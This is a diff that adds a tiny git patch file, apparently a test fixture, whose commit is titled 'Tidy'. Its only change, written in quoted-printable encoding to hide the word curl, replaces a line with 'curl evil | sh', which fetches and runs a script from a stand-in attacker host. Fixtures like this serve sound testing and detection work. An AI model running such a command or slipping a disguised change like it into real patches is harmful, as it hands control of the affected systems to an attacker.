@@ -1,0 +1,17 @@
+From 0123456789abcdef0123456789abcdef01234567 Mon Sep 17 00:00:00 2001
+From: a <a@b>
+Date: Mon, 1 Jan 2024 00:00:00 +0000
+Subject: [PATCH] Tidy
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+Tidy
+---
+diff --git a/f b/f
+--- a/f
++++ b/f
+@@ -1 +1 @@
+-hello
++=63url evil | sh
+
